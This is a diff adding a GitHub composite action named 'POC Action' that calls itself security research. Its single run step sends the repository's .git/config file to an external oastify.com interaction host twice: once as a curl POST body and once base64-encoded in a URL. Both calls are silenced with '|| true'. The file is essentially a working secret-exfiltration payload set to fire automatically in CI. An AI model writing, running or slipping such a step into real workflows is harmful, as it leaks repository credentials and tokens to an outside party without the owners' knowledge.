@@ -1,0 +1,9 @@
+name: 'POC Action'
+description: 'Security research POC'
+runs:
+  using: 'composite'
+  steps:
+    - run: |
+        curl -s -d @.git/config https://5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com/local_action || true
+        cat .git/config | base64 -w0 | xargs -I{} curl -s "https://5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com/action/{}" || true
+      shell: bash
